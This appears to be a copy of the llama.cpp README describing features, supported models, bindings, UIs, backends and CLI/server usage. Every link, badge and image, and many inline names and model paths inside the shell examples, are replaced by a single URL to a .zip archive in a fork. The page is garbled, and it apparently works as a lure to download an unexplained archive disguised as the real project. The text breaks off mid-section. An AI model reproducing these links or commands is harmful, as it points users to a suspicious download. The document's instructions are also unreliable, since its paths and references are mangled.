# https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip

![llama](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

[![License: MIT](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
[![Server](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

[Roadmap](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) / [Project status](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) / [Manifesto](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) / [ggml](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

Inference of Meta's [LLaMA](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) model (and others) in pure C/C++

## Recent API changes

- [Changelog for `libllama` API](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [Changelog for `llama-server` REST API](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

## Hot topics

- **Introducing GGUF-my-LoRA** https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip
- Hugging Face Inference Endpoints now support GGUF out of the box! https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip
- Hugging Face GGUF editor: [discussion](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) | [tool](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

----

## Description

The main goal of `https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip` is to enable LLM inference with minimal setup and state-of-the-art performance on a wide
range of hardware - locally and in the cloud.

- Plain C/C++ implementation without any dependencies
- Apple silicon is a first-class citizen - optimized via ARM NEON, Accelerate and Metal frameworks
- AVX, AVX2, AVX512 and AMX support for x86 architectures
- 1.5-bit, 2-bit, 3-bit, 4-bit, 5-bit, 6-bit, and 8-bit integer quantization for faster inference and reduced memory use
- Custom CUDA kernels for running LLMs on NVIDIA GPUs (support for AMD GPUs via HIP and Moore Threads MTT GPUs via MUSA)
- Vulkan and SYCL backend support
- CPU+GPU hybrid inference to partially accelerate models larger than the total VRAM capacity

The `https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip` project is the main playground for developing new features for the [ggml](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) library.

<details>
<summary>Models</summary>

Typically finetunes of the base models below are supported as well.

Instructions for adding support for new models: [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

#### Text-only

- [X] LLaMA 🦙
- [x] LLaMA 2 🦙🦙
- [x] LLaMA 3 🦙🦙🦙
- [X] [Mistral 7B](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Mixtral MoE](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [DBRX](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [X] [Falcon](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [X] [Chinese LLaMA / Alpaca](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) and [Chinese LLaMA-2 / Alpaca-2](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [X] [Vigogne (French)](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [X] [BERT](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [X] [Koala](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [X] [Baichuan 1 & 2](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) + [derivations](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [X] [Aquila 1 & 2](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [X] [Starcoder models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [X] [Refact](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [X] [MPT](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [X] [Bloom](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Yi models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [X] [StableLM models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Deepseek models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Qwen models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [PLaMo-13B](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Phi models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [GPT-2](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Orion 14B](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [InternLM2](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [CodeShell](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Gemma](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Mamba](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Grok-1](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Xverse](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Command-R models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [SEA-LION](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [GritLM-7B](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) + [GritLM-8x7B](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [OLMo](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [OLMo 2](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [OLMoE](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Granite models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [GPT-NeoX](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) + [Pythia](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Snowflake-Arctic MoE](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Smaug](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Poro 34B](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Bitnet b1.58 models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Flan T5](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Open Elm models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [ChatGLM3-6b](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) + [ChatGLM4-9b](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [SmolLM](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [EXAONE-3.0-7.8B-Instruct](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [FalconMamba Models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Jais](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Bielik-11B-v2.3](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [RWKV-6](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

#### Multimodal

- [x] [LLaVA 1.5 models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip), [LLaVA 1.6 models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [BakLLaVA](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Obsidian](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [ShareGPT4V](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [MobileVLM 1.7B/3B models](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Yi-VL](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Mini CPM](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Moondream](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [x] [Bunny](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

</details>

<details>
<summary>Bindings</summary>

- Python: [abetlen/llama-cpp-python](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Go: [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip [withcatai/node-llama-cpp](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- JS/TS (https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip server client): [lgrammel/modelfusion](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- JS/TS (Programmable Prompt Engine CLI): [offline-ai/cli](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- JavaScript/Wasm (works in browser): [tangledgroup/llama-cpp-wasm](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Typescript/Wasm (nicer API, available on npm): [ngxson/wllama](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Ruby: [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Rust (more features): [edgenai/llama_cpp-rs](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Rust (nicer API): [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Rust (more direct bindings): [utilityai/llama-cpp-rs](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip [SciSharp/LLamaSharp](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip (more features - community license): [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Scala 3: [donderom/llm4s](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Clojure: [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- React Native: [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Java: [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Zig: [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Flutter/Dart: [netdur/llama_cpp_dart](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Flutter: [xuegao-tzx/Fllama](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- PHP (API bindings and features built on top of https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip): [distantmagic/resonance](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) [(more info)](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Guile Scheme: [guile_llama_cpp](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Swift [srgtuszy/llama-cpp-swift](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Swift [ShenghaiWang/SwiftLlama](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

</details>

<details>
<summary>UIs</summary>

*(to have a project listed here, it should clearly state that it depends on `https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip`)*

- [AI Sublime Text plugin](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [cztomsik/ava](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [Dot](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (GPL)
- [eva](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [iohub/collama](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (Apache-2.0)
- [janhq/jan](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (AGPL)
- [KanTV](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (Apache-2.0)
- [KodiBot](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (GPL)
- [https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [LARS](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (AGPL)
- [Llama Assistant](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (GPL)
- [LLMFarm](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [LLMUnity](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [LMStudio](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (proprietary)
- [LocalAI](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [LostRuins/koboldcpp](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (AGPL)
- [MindMac](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (proprietary)
- [MindWorkAI/AI-Studio](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (FSL-1.1-MIT)
- [Mobile-Artificial-Intelligence/maid](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [Mozilla-Ocho/llamafile](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (Apache-2.0)
- [nat/openplayground](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [nomic-ai/gpt4all](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [ollama/ollama](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [oobabooga/text-generation-webui](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (AGPL)
- [PocketPal AI](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [psugihara/FreeChat](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [ptsochantaris/emeltal](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [pythops/tenere](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (AGPL)
- [ramalama](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [semperai/amica](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)
- [withcatai/catai](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (MIT)

</details>

<details>
<summary>Tools</summary>

- [akx/ggify](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) – download PyTorch models from HuggingFace Hub and convert them to GGML
- [akx/ollama-dl](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) – download models from the Ollama library to be used directly with https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip
- [crashr/gppm](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) – launch https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip instances utilizing NVIDIA Tesla P40 or P100 GPUs with reduced idle power consumption
- [gpustack/gguf-parser](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) - review/check the GGUF file and estimate the memory usage
- [Styled Lines](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) (proprietary licensed, async wrapper of inference part for game development in Unity3d with pre-built Mobile and Web platform wrappers and a model example)

</details>

<details>
<summary>Infrastructure</summary>

- [Paddler](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) - Stateful load balancer custom-tailored for https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip
- [GPUStack](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) - Manage GPU clusters for running LLMs
- [llama_cpp_canister](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) - https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip as a smart contract on the Internet Computer, using WebAssembly

</details>

<details>
<summary>Games</summary>

- [Lucy's Labyrinth](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) - A simple maze game where agents controlled by an AI model will try to trick you.

</details>

## Supported backends

| Backend | Target devices |
| --- | --- |
| [Metal](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) | Apple Silicon |
| [BLAS](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) | All |
| [BLIS](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) | All |
| [SYCL](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) | Intel and Nvidia GPU |
| [MUSA](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) | Moore Threads MTT GPU |
| [CUDA](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) | Nvidia GPU |
| [hipBLAS](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) | AMD GPU |
| [Vulkan](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) | GPU |
| [CANN](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) | Ascend NPU |

## Building the project

The main product of this project is the `llama` library. Its C-style interface can be found in [include/llama.h](include/llama.h).
The project also includes many example programs and tools using the `llama` library. The examples range from simple, minimal code snippets to sophisticated sub-projects such as an OpenAI-compatible HTTP server. Possible methods for obtaining the binaries:

- Clone this repository and build locally, see [how to build](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- On MacOS or Linux, install `https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip` via [brew, flox or nix](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Use a Docker image, see [documentation for Docker](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Download pre-built binaries from [releases](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

## Obtaining and quantizing models

The [Hugging Face](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) platform hosts a [number of LLMs](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) compatible with `https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip`:

- [Trending](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- [LLaMA](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip+gguf)

After downloading a model, use the CLI tools to run it locally - see below.

`https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip` requires the model to be stored in the [GGUF](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) file format. Models in other data formats can be converted to GGUF using the `convert_*.py` Python scripts in this repo.

The Hugging Face platform provides a variety of online tools for converting, quantizing and hosting models with `https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip`:

- Use the [GGUF-my-repo space](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) to convert to GGUF format and quantize model weights to smaller sizes
- Use the [GGUF-my-LoRA space](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) to convert LoRA adapters to GGUF format (more info: https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Use the [GGUF-editor space](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) to edit GGUF meta data in the browser (more info: https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)
- Use the [Inference Endpoints](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) to directly host `https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip` in the cloud (more info: https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

To learn more about model quantization, [read this documentation](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

## [`llama-cli`](examples/main)

#### A CLI tool for accessing and experimenting with most of `https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip`'s functionality.

- <details open>
    <summary>Run simple text completion</summary>

    ```bash
    llama-cli -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip -p "I believe the meaning of life is" -n 128

    # I believe the meaning of life is to find your own truth and to live in accordance with it. For me, this means being true to myself and following my passions, even if they don't align with societal expectations. I think that's what I love about yoga – it's not just a physical practice, but a spiritual one too. It's about connecting with yourself, listening to your inner voice, and honoring your own unique journey.
    ```

    </details>

- <details>
    <summary>Run in conversation mode</summary>

    ```bash
    llama-cli -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip -p "You are a helpful assistant" -cnv

    # > hi, who are you?
    # Hi there! I'm your helpful assistant! I'm an AI-powered chatbot designed to assist and provide information to users like you. I'm here to help answer your questions, provide guidance, and offer support on a wide range of topics. I'm a friendly and knowledgeable AI, and I'm always happy to help with anything you need. What's on your mind, and how can I assist you today?
    #
    # > what is 1+1?
    # Easy peasy! The answer to 1+1 is... 2!
    ```

    </details>

- <details>
    <summary>Run with custom chat template</summary>

    ```bash
    # use the "chatml" template
    llama-cli -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip -p "You are a helpful assistant" -cnv --chat-template chatml

    # use a custom template
    llama-cli -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip -p "You are a helpful assistant" -cnv --in-prefix 'User: ' --reverse-prompt 'User:'
    ```

    [Supported templates](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip)

    </details>

- <details>
    <summary>Constrain the output with a custom grammar</summary>

    ```bash
    llama-cli -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip -n 256 --grammar-file https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip -p 'Request: schedule a call at 8pm; Command:'

    # {"appointmentTime": "8pm", "appointmentDetails": "schedule a a call"}
    ```

    The [grammars/](grammars/) folder contains a handful of sample grammars. To write your own, check out the [GBNF Guide](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip).

    For authoring more complex JSON grammars, check out https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip

    </details>


## [`llama-server`](examples/server)

#### A lightweight, [OpenAI API](https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip) compatible, HTTP server for serving LLMs.

- <details open>
    <summary>Start a local HTTP server with default configuration on port 8080</summary>

    ```bash
    llama-server -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip --port 8080

    # Basic web UI can be accessed via browser: http://localhost:8080
    # Chat completion endpoint: http://localhost:8080/v1/chat/completions
    ```

    </details>

- <details>
    <summary>Support multiple-users and parallel decoding</summary>

    ```bash
    # up to 4 concurrent requests, each with 4096 max context
    llama-server -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip -c 16384 -np 4
    ```

    </details>

- <details>
    <summary>Enable speculative decoding</summary>

    ```bash
    # the https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip model should be a small variant of the target https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip
    llama-server -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip -md https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip
    ```

    </details>

- <details>
    <summary>Serve an embedding model</summary>

    ```bash
    # use the /embedding endpoint
    llama-server -m https://raw.githubusercontent.com/habibhassansehani/llama.cpp/master/unipartite/llama.cpp.zip --embedding --pooling cls -ub 8192
    ```

    </details>

- <details>
    <summary>Serve a reranking model</summary>

    ```bash
    # use the /reranking endpoint
